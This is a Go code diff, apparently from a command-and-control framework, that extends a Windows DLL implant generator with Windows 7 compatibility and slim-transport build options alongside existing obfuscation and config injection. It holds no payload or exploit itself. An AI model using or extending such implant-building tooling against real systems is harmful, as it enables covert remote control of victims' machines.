@@ -61,6 +61,12 @@ func checkCgoCrossCompiler(goarch string) error {
 func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 	dataDir := filepath.Dir(outputDir)
 	profile := NormalizeImplantConfig(&cfg, dataDir)
+	if err := win7CompatConflict(&cfg); err != nil {
+		return "", err
+	}
+	if err := slimTransportConflict(&cfg); err != nil {
+		return "", err
+	}
 
 	tmpDir, err := os.MkdirTemp("", "forgec2-agent-dll-*")
 	if err != nil {
@@ -74,14 +80,19 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 		}
 	}
 
-	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
+	if err := extractAgentSources(payloadFS, tmpDir, cfg.Slim); err != nil {
 		return "", err
 	}
 
-	goMod := buildGoMod("windows", true)
+	goMod := buildGoMod("windows", true, cfg.Slim, cfg.Win7Compat)
 
 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
 		return "", err
+	}
+	if cfg.Win7Compat {
+		if err := materializeWin7Shim(tmpDir); err != nil {
+			return "", err
+		}
 	}
 
 	ldflags, blob, sKey := buildLdflags(cfg, profile, "windows")
@@ -115,7 +126,7 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 		return "", fmt.Errorf("go executable not found in PATH")
 	}
 
-	if err := runGoModTidy(goCmd, tmpDir); err != nil {
+	if err := runGoModTidy(goCmd, tmpDir, cfg.Win7Compat); err != nil {
 		return "", err
 	}
 
@@ -123,7 +134,7 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	if err := buildAgentBinaryDLL(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", goarch, blob, sKey); err != nil {
+	if err := buildAgentBinaryDLL(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", goarch, blob, sKey, cfg.Win7Compat); err != nil {
 		return "", err
 	}
 
@@ -154,7 +165,7 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 
 // buildAgentBinaryDLL runs `go build -buildmode=c-shared` with CGO_ENABLED=1.
 // It checks for cross-compiler availability on non-Windows hosts.
-func buildAgentBinaryDLL(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch, configBlob, sConfigKey string) error {
+func buildAgentBinaryDLL(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch, configBlob, sConfigKey string, win7 bool) error {
 	if err := writeConfigInjectFile(workDir, configBlob, sConfigKey); err != nil {
 		return fmt.Errorf("write config inject file: %w", err)
 	}
@@ -177,7 +188,7 @@ func buildAgentBinaryDLL(goCmd, workDir, ldflags, outPath string, obfuscate bool
 		".",
 	)...)
 	cmd.Dir = workDir
-	cmd.Env = goModuleEnv(
+	cmd.Env = goToolchainEnv(win7,
 		"GOOS="+goos,
 		"GOARCH="+goarch,
 		"CGO_ENABLED=1",
